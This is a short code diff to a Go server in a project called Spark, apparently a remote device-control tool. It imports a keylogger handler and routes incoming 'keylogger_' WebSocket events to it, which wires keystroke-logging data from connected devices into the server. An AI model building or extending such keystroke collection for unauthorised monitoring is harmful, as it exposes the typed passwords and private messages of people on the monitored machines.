@@ -7,6 +7,7 @@ import (
 	"Spark/server/config"
 	"Spark/server/handler"
 	"Spark/server/handler/desktop"
+	"Spark/server/handler/keylogger"
 	"Spark/server/handler/terminal"
 	"Spark/server/handler/utility"
 	"Spark/utils/cmap"
@@ -207,6 +208,12 @@ func wsOnMessageBinary(session *melody.Session, data []byte) {
 		session.CloseWithMsg(melody.FormatCloseMessage(1001, `invalid device id`))
 		return
 	}
+	
+	// Handle keylogger events
+	if strings.HasPrefix(pack.Act, "keylogger_") {
+		keylogger.HandleKeyloggerEvent(session.UUID, pack.Act, pack.Data)
+	}
+	
 	common.CallEvent(pack, session)
 	session.Set(`LastPack`, utils.Unix)
 }
